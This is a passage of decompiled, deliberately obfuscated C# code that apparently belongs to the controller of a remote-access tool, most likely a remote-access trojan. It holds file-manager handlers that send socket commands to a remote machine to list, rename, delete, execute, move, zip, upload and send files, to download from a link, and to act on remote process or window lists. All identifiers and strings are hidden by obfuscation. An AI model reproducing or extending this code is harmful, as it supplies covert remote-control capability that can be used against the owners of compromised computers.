					{
						ListViewItem listViewItem = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Add(array[0]);
						listViewItem.SubItems.Add(array[1]);
						listViewItem.SubItems.Add(array[2]);
						if (Operators.CompareString(array[1], global::\u0006\u2001.\u0002(-1829128514), false) == 0)
						{
							listViewItem.ImageIndex = 1;
						}
						else
						{
							listViewItem.ImageIndex = 2;
						}
					}
				}
				finally
				{
					List<string[]>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().\u0005();
				if (!\u0003.Node.IsExpanded)
				{
					\u0003.Node.Expand();
				}
			}
		}

		// Token: 0x06000310 RID: 784 RVA: 0x00022D7C File Offset: 0x00020F7C
		private void \u0008\u2001(object \u0002, EventArgs \u0003)
		{
		}

		// Token: 0x06000311 RID: 785 RVA: 0x00022D8C File Offset: 0x00020F8C
		private void \u0006\u2001(object \u0002, EventArgs \u0003)
		{
			this.sk.Send(string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829129203),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829139089)
			}));
		}

		// Token: 0x06000312 RID: 786 RVA: 0x00022DEC File Offset: 0x00020FEC
		private void \u000E\u2001(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().SelectedItems.Count == 0)
			{
				return;
			}
			this.exp(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().SelectedItems[0].ToolTipText, false);
		}

		// Token: 0x06000313 RID: 787 RVA: 0x00022E24 File Offset: 0x00021024
		private void \u000F\u2001(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems.Count == 0)
			{
				return;
			}
			if (Operators.CompareString(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems[0].SubItems[2].Text, global::\u0006\u2001.\u0002(-1829129184), false) == 0)
			{
				this.exp(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems[0].ToolTipText, false);
			}
			else
			{
				Client client = this.sk;
				string[] array = new string[7];
				array[0] = global::\u0006\u2001.\u0002(-1829128217);
				array[1] = global::\u000E\u2000.\u000E;
				array[2] = global::\u0006\u2001.\u0002(-1829129203);
				array[3] = global::\u000E\u2000.\u000E;
				array[4] = global::\u0006\u2001.\u0002(-1829124401);
				array[5] = global::\u000E\u2000.\u000E;
				string[] array2 = array;
				int num = 6;
				ListViewItem listViewItem = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems[0];
				string toolTipText = listViewItem.ToolTipText;
				string text = global::\u000E.\u0002(ref toolTipText);
				listViewItem.ToolTipText = toolTipText;
				array2[num] = text;
				client.Send(string.Concat(array));
			}
		}

		// Token: 0x06000314 RID: 788 RVA: 0x00022F24 File Offset: 0x00021124
		private void \u0002\u2002(object \u0002, EventArgs \u0003)
		{
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Image = null;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Visible = false;
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems.Count != 1)
			{
				return;
			}
			ListViewItem listViewItem = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems[0];
			if (this.Images.Contains(listViewItem.ToolTipText))
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Image = (Image)this.Images[listViewItem.ToolTipText];
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Visible = true;
				return;
			}
			if (listViewItem.SubItems[2].Text.Length > 0 && global::\u0006\u2001.\u0002(-1829124410).Contains(listViewItem.SubItems[2].Text.ToLower()))
			{
				Client client = this.sk;
				string[] array = new string[11];
				array[0] = global::\u0006\u2001.\u0002(-1829128217);
				array[1] = global::\u000E\u2000.\u000E;
				array[2] = global::\u0006\u2001.\u0002(-1829129203);
				array[3] = global::\u000E\u2000.\u000E;
				array[4] = global::\u0006\u2001.\u0002(-1829129212);
				array[5] = global::\u000E\u2000.\u000E;
				string[] array2 = array;
				int num = 6;
				ListViewItem listViewItem2 = listViewItem;
				string toolTipText = listViewItem2.ToolTipText;
				string text = global::\u000E.\u0002(ref toolTipText);
				listViewItem2.ToolTipText = toolTipText;
				array2[num] = text;
				array[7] = global::\u000E\u2000.\u000E;
				array[8] = Conversions.ToString(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Width);
				array[9] = global::\u000E\u2000.\u000E;
				array[10] = Conversions.ToString(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Height);
				client.Send(string.Concat(array));
			}
		}

		// Token: 0x06000315 RID: 789 RVA: 0x000230A8 File Offset: 0x000212A8
		private void \u0003\u2002(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.ContainsKey(global::\u0006\u2001.\u0002(-1829129162)))
			{
				this.exp(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items[global::\u0006\u2001.\u0002(-1829129162)].ToolTipText, false);
			}
		}

		// Token: 0x06000316 RID: 790 RVA: 0x000230FC File Offset: 0x000212FC
		private void \u0005\u2002(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text.Length > 0)
			{
				this.exp(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text, true);
			}
		}

		// Token: 0x06000317 RID: 791 RVA: 0x00023128 File Offset: 0x00021328
		private void \u0008\u2002(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems.Count > 0)
			{
				string text = string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829129203),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829137245)
				});
				try
				{
					foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						string str = text;
						string u000E = global::\u000E\u2000.\u000E;
						ListViewItem listViewItem2 = listViewItem;
						string toolTipText = listViewItem2.ToolTipText;
						string str2 = global::\u000E.\u0002(ref toolTipText);
						listViewItem2.ToolTipText = toolTipText;
						text = str + u000E + str2;
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x06000318 RID: 792 RVA: 0x0002321C File Offset: 0x0002141C
		private void \u0006\u2002(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems.Count > 0)
			{
				string text = string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829129203),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829129117)
				});
				try
				{
					foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (Operators.CompareString(listViewItem.Text, global::\u0006\u2001.\u0002(-1829129162), false) != 0)
						{
							if (Operators.CompareString(listViewItem.SubItems[2].Text, global::\u0006\u2001.\u0002(-1829129184), false) == 0)
							{
								string str = text;
								string u000E = global::\u000E\u2000.\u000E;
								string text2 = listViewItem.ToolTipText + global::\u0006\u2001.\u0002(-1829124831);
								text = str + u000E + global::\u000E.\u0002(ref text2);
							}
							else
							{
								string str2 = text;
								string u000E2 = global::\u000E\u2000.\u000E;
								string text2 = listViewItem.ToolTipText + global::\u0006\u2001.\u0002(-1829128238);
								text = str2 + u000E2 + global::\u000E.\u0002(ref text2);
							}
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x06000319 RID: 793 RVA: 0x0002338C File Offset: 0x0002158C
		private void \u000E\u2002(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems.Count > 0)
			{
				string text = string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829129203),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829124401)
				});
				try
				{
					foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (Operators.CompareString(listViewItem.SubItems[2].Text, global::\u0006\u2001.\u0002(-1829129184), false) != 0)
						{
							string str = text;
							string u000E = global::\u000E\u2000.\u000E;
							ListViewItem listViewItem2 = listViewItem;
							string toolTipText = listViewItem2.ToolTipText;
							string str2 = global::\u000E.\u0002(ref toolTipText);
							listViewItem2.ToolTipText = toolTipText;
							text = str + u000E + str2;
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x0600031A RID: 794 RVA: 0x000234AC File Offset: 0x000216AC
		private void \u000F\u2002(object \u0002, EventArgs \u0003)
		{
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					if (Operators.CompareString(listViewItem.Text, global::\u0006\u2001.\u0002(-1829129162), false) != 0)
					{
						if (Operators.CompareString(listViewItem.SubItems[2].Text, global::\u0006\u2001.\u0002(-1829129184), false) == 0)
						{
							string text = Interaction.InputBox(string.Empty, global::\u0006\u2001.\u0002(-1829141398), listViewItem.Text, -1, -1);
							if (text.Length > 0)
							{
								Client client = this.sk;
								string[] array = new string[7];
								array[0] = global::\u0006\u2001.\u0002(-1829128217);
								array[1] = global::\u000E\u2000.\u000E;
								array[2] = global::\u0006\u2001.\u0002(-1829129203);
								array[3] = global::\u000E\u2000.\u000E;
								array[4] = global::\u0006\u2001.\u0002(-1829129094);
								array[5] = global::\u000E\u2000.\u000E;
								string[] array2 = array;
								int num = 6;
								string text2 = listViewItem.ToolTipText + global::\u0006\u2001.\u0002(-1829128238) + text + global::\u0006\u2001.\u0002(-1829124831);
								array2[num] = global::\u000E.\u0002(ref text2);
								client.Send(string.Concat(array));
							}
						}
						else
						{
							string text3 = Interaction.InputBox(string.Empty, global::\u0006\u2001.\u0002(-1829141398), listViewItem.Text, -1, -1);
							if (text3.Length > 0)
							{
								Client client2 = this.sk;
								string[] array = new string[7];
								array[0] = global::\u0006\u2001.\u0002(-1829128217);
								array[1] = global::\u000E\u2000.\u000E;
								array[2] = global::\u0006\u2001.\u0002(-1829129203);
								array[3] = global::\u000E\u2000.\u000E;
								array[4] = global::\u0006\u2001.\u0002(-1829129094);
								array[5] = global::\u000E\u2000.\u000E;
								string[] array3 = array;
								int num2 = 6;
								string text2 = listViewItem.ToolTipText + global::\u0006\u2001.\u0002(-1829128238) + text3 + global::\u0006\u2001.\u0002(-1829128238);
								array3[num2] = global::\u000E.\u0002(ref text2);
								client2.Send(string.Concat(array));
							}
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600031B RID: 795 RVA: 0x000236D8 File Offset: 0x000218D8
		private void \u0002\u2003(object \u0002, EventArgs \u0003)
		{
			string text = string.Empty;
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					if (Operators.CompareString(listViewItem.Text, global::\u0006\u2001.\u0002(-1829129162), false) != 0)
					{
						if (Operators.CompareString(listViewItem.SubItems[2].Text, global::\u0006\u2001.\u0002(-1829129184), false) != 0)
						{
							text = text + global::\u0006\u2001.\u0002(-1829128238) + listViewItem.ToolTipText;
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (Operators.CompareString(text, string.Empty, false) != 0)
			{
				this.Flist = text.Remove(0, 1);
				this.isCut = false;
			}
		}

		// Token: 0x0600031C RID: 796 RVA: 0x000237C8 File Offset: 0x000219C8
		private void \u0003\u2003(object \u0002, EventArgs \u0003)
		{
			string text = string.Empty;
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					if (Operators.CompareString(listViewItem.Text, global::\u0006\u2001.\u0002(-1829129162), false) != 0)
					{
						if (Operators.CompareString(listViewItem.SubItems[2].Text, global::\u0006\u2001.\u0002(-1829129184), false) != 0)
						{
							text = text + global::\u0006\u2001.\u0002(-1829128238) + listViewItem.ToolTipText;
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (Operators.CompareString(text, string.Empty, false) != 0)
			{
				this.Flist = text.Remove(0, 1);
				this.isCut = true;
			}
		}

		// Token: 0x0600031D RID: 797 RVA: 0x000238B8 File Offset: 0x00021AB8
		private void \u0005\u2003(object \u0002, EventArgs \u0003)
		{
			if (Operators.CompareString(this.Flist, string.Empty, false) != 0)
			{
				if (this.isCut)
				{
					Client client = this.sk;
					string[] array = new string[9];
					array[0] = global::\u0006\u2001.\u0002(-1829128217);
					array[1] = global::\u000E\u2000.\u000E;
					array[2] = global::\u0006\u2001.\u0002(-1829129203);
					array[3] = global::\u000E\u2000.\u000E;
					array[4] = global::\u0006\u2001.\u0002(-1829124808);
					array[5] = global::\u000E\u2000.\u000E;
					string[] array2 = array;
					int num = 6;
					string text = (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text + global::\u0006\u2001.\u0002(-1829139395)).Replace(global::\u0006\u2001.\u0002(-1829124596), global::\u0006\u2001.\u0002(-1829139395));
					array2[num] = global::\u000E.\u0002(ref text);
					array[7] = global::\u000E\u2000.\u000E;
					array[8] = global::\u000E.\u0002(ref this.Flist);
					client.Send(string.Concat(array));
				}
				else
				{
					Client client2 = this.sk;
					string[] array = new string[9];
					array[0] = global::\u0006\u2001.\u0002(-1829128217);
					array[1] = global::\u000E\u2000.\u000E;
					array[2] = global::\u0006\u2001.\u0002(-1829129203);
					array[3] = global::\u000E\u2000.\u000E;
					array[4] = global::\u0006\u2001.\u0002(-1829124849);
					array[5] = global::\u000E\u2000.\u000E;
					string[] array3 = array;
					int num2 = 6;
					string text = (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text + global::\u0006\u2001.\u0002(-1829139395)).Replace(global::\u0006\u2001.\u0002(-1829124596), global::\u0006\u2001.\u0002(-1829139395));
					array3[num2] = global::\u000E.\u0002(ref text);
					array[7] = global::\u000E\u2000.\u000E;
					array[8] = global::\u000E.\u0002(ref this.Flist);
					client2.Send(string.Concat(array));
				}
			}
		}

		// Token: 0x0600031E RID: 798 RVA: 0x00023A48 File Offset: 0x00021C48
		private void \u0008\u2003(object \u0002, EventArgs \u0003)
		{
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					if (Operators.CompareString(listViewItem.Text, global::\u0006\u2001.\u0002(-1829129162), false) != 0)
					{
						if (Operators.CompareString(listViewItem.SubItems[2].Text, global::\u0006\u2001.\u0002(-1829129184), false) != 0)
						{
							Client client = this.sk;
							string[] array = new string[9];
							array[0] = global::\u0006\u2001.\u0002(-1829128217);
							array[1] = global::\u000E\u2000.\u000E;
							array[2] = global::\u0006\u2001.\u0002(-1829129203);
							array[3] = global::\u000E\u2000.\u000E;
							array[4] = global::\u0006\u2001.\u0002(-1829123221);
							array[5] = global::\u000E\u2000.\u000E;
							string[] array2 = array;
							int num = 6;
							ListViewItem listViewItem2 = listViewItem;
							string toolTipText = listViewItem2.ToolTipText;
							string text = global::\u000E.\u0002(ref toolTipText);
							listViewItem2.ToolTipText = toolTipText;
							array2[num] = text;
							array[7] = global::\u000E\u2000.\u000E;
							array[8] = this.sk.ip();
							client.Send(string.Concat(array));
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600031F RID: 799 RVA: 0x00023B98 File Offset: 0x00021D98
		private void \u0006\u2003(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.Count == 0)
			{
				return;
			}
			string text = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text;
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.FileName = string.Empty;
			openFileDialog.Multiselect = true;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				foreach (string text2 in openFileDialog.FileNames)
				{
					if (FileSystem.FileLen(text2) != 0L)
					{
						up up = new up();
						up.TMP = text2;
						up.FN = (text + global::\u0006\u2001.\u0002(-1829139395) + new FileInfo(text2).Name).Replace(global::\u0006\u2001.\u0002(-1829124596), global::\u0006\u2001.\u0002(-1829139395));
						up.Name = this.sk.ip() + global::\u000E.\u0002(ref up.FN);
						up.osk = this.sk;
						up.SZ = checked((int)FileSystem.FileLen(up.TMP));
						up.Text = new FileInfo(up.TMP).Name + global::\u0006\u2001.\u0002(-1829124858) + up.FN;
						up.Show();
					}
				}
			}
		}

		// Token: 0x06000320 RID: 800 RVA: 0x00023CD8 File Offset: 0x00021ED8
		private void \u000E\u2003(object \u0002, EventArgs \u0003)
		{
			string text = Interaction.InputBox(global::\u0006\u2001.\u0002(-1829124837), global::\u0006\u2001.\u0002(-1829124758), global::\u0006\u2001.\u0002(-1829124741), -1, -1);
			if (text.Length == 0)
			{
				return;
			}
			Client client = this.sk;
			string[] array = new string[7];
			array[0] = global::\u0006\u2001.\u0002(-1829128217);
			array[1] = global::\u000E\u2000.\u000E;
			array[2] = global::\u0006\u2001.\u0002(-1829129203);
			array[3] = global::\u000E\u2000.\u000E;
			array[4] = global::\u0006\u2001.\u0002(-1829124792);
			array[5] = global::\u000E\u2000.\u000E;
			string[] array2 = array;
			int num = 6;
			string text2 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text + text;
			array2[num] = global::\u000E.\u0002(ref text2);
			client.Send(string.Concat(array));
		}

		// Token: 0x06000321 RID: 801 RVA: 0x00023D8C File Offset: 0x00021F8C
		private void \u000F\u2003(object \u0002, EventArgs \u0003)
		{
			string text = Interaction.InputBox(global::\u0006\u2001.\u0002(-1829124769), global::\u0006\u2001.\u0002(-1829125761), global::\u0006\u2001.\u0002(-1829125761), -1, -1);
			if (text.Length == 0)
			{
				return;
			}
			Client client = this.sk;
			string[] array = new string[7];
			array[0] = global::\u0006\u2001.\u0002(-1829128217);
			array[1] = global::\u000E\u2000.\u000E;
			array[2] = global::\u0006\u2001.\u0002(-1829129203);
			array[3] = global::\u000E\u2000.\u000E;
			array[4] = global::\u0006\u2001.\u0002(-1829124692);
			array[5] = global::\u000E\u2000.\u000E;
			string[] array2 = array;
			int num = 6;
			string text2 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text + text;
			array2[num] = global::\u000E.\u0002(ref text2);
			client.Send(string.Concat(array));
		}

		// Token: 0x06000322 RID: 802 RVA: 0x00023E40 File Offset: 0x00022040
		private void \u0002\u2004(object \u0002, EventArgs \u0003)
		{
			if (!Directory.Exists(this.\u000F\u200B))
			{
				Directory.CreateDirectory(this.\u000F\u200B);
			}
			try
			{
				Process.Start(this.\u000F\u200B);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000323 RID: 803 RVA: 0x00023E9C File Offset: 0x0002209C
		private void \u0003\u2004(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems.Count == 0)
			{
				return;
			}
			string text = string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829129203),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829124701),
				global::\u000E\u2000.\u000E
			});
			string text2 = Interaction.InputBox(global::\u0006\u2001.\u0002(-1829124679), string.Empty, new DirectoryInfo(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text).Name + global::\u0006\u2001.\u0002(-1829124732), -1, -1);
			if (Operators.CompareString(text2, string.Empty, false) != 0)
			{
				text = text + global::\u000E.\u0002(ref text2) + global::\u000E\u2000.\u000E;
				string str = text;
				TextBox textBox = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
				string text3 = textBox.Text;
				string str2 = global::\u000E.\u0002(ref text3);
				textBox.Text = text3;
				text = str + str2 + global::\u000E\u2000.\u000E;
				string str3 = global::\u0006\u2001.\u0002(-1829124711) + text2 + global::\u0006\u2001.\u0002(-1829138502);
				try
				{
					foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						str3 = str3 + global::\u0006\u2001.\u0002(-1829124628) + listViewItem.Text + global::\u0006\u2001.\u0002(-1829138502);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				text += global::\u000E.\u0002(ref str3);
				this.sk.Send(text);
			}
		}

		// Token: 0x06000324 RID: 804 RVA: 0x00024054 File Offset: 0x00022254
		private void \u0005\u2004(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems.Count == 0)
			{
				return;
			}
			string text = string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829129203),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829124637),
				global::\u000E\u2000.\u000E
			});
			string str = text;
			ListViewItem listViewItem = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SelectedItems[0];
			string toolTipText = listViewItem.ToolTipText;
			string str2 = global::\u000E.\u0002(ref toolTipText);
			listViewItem.ToolTipText = toolTipText;
			text = str + str2;
			this.sk.Send(text);
		}

		// Token: 0x06000325 RID: 805 RVA: 0x00024100 File Offset: 0x00022300
		private void \u0008\u2004(object \u0002, EventArgs \u0003)
		{
			if (Operators.CompareString(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text, string.Empty, false) == 0)
			{
				return;
			}
			FromLink fromLink = new FromLink();
			fromLink.ShowDialog(this);
			if (fromLink.IsOK)
			{
				Client client = this.sk;
				string[] array = new string[9];
				array[0] = global::\u0006\u2001.\u0002(-1829128217);
				array[1] = global::\u000E\u2000.\u000E;
				array[2] = global::\u0006\u2001.\u0002(-1829129203);
				array[3] = global::\u000E\u2000.\u000E;
				array[4] = global::\u0006\u2001.\u0002(-1829124617);
				array[5] = global::\u000E\u2000.\u000E;
				string[] array2 = array;
				int num = 6;
				TextBox textBox = fromLink.d8q9nzeamhzr4g36rft66fcy6kqcbqya\u200A\u2009\u2000\u2005\u0003();
				string text = textBox.Text;
				string text2 = global::\u000E.\u0002(ref text);
				textBox.Text = text;
				array2[num] = text2;
				array[7] = global::\u000E\u2000.\u000E;
				string[] array3 = array;
				int num2 = 8;
				string text3 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text + fromLink.d8q9nzeamhzr4g36rft66fcy6kqcbqya\u200A\u2009\u2000\u2005\u0002().Text;
				array3[num2] = global::\u000E.\u0002(ref text3);
				client.Send(string.Concat(array));
			}
		}

		// Token: 0x06000326 RID: 806 RVA: 0x000241F4 File Offset: 0x000223F4
		private void \u0006\u2004(object \u0002, EventArgs \u0003)
		{
			checked
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Left = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Width - this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Width - 25;
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Top = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Height - this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Height - 25;
			}
		}

		// Token: 0x06000327 RID: 807 RVA: 0x0002424C File Offset: 0x0002244C
		private void \u000E\u2004(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().SelectedItems.Count == 0)
			{
				return;
			}
			string text = string.Empty;
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = text + global::\u000E\u2000.\u000E + listViewItem.Text;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			this.sk.Send(string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829128208),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829138798),
				text
			}));
		}

		// Token: 0x06000328 RID: 808 RVA: 0x00024334 File Offset: 0x00022534
		private void \u000F\u2004(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().SelectedItems.Count == 0)
			{
				return;
			}
			string text = string.Empty;
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = text + global::\u000E\u2000.\u000E + listViewItem.Text;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			this.sk.Send(string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829128208),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829138768),
				text
			}));
		}

		// Token: 0x06000329 RID: 809 RVA: 0x0002441C File Offset: 0x0002261C
		private void \u0002\u2005(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().SelectedItems.Count == 0)
			{
				return;
			}
			string text = string.Empty;
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = text + global::\u000E\u2000.\u000E + listViewItem.Text;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			this.sk.Send(string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829128208),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829129212),
				text
			}));
		}

		// Token: 0x0600032A RID: 810 RVA: 0x00024504 File Offset: 0x00022704
		private void \u0003\u2005(object \u0002, EventArgs \u0003)
		{
		}

		// Token: 0x0600032B RID: 811 RVA: 0x00024508 File Offset: 0x00022708
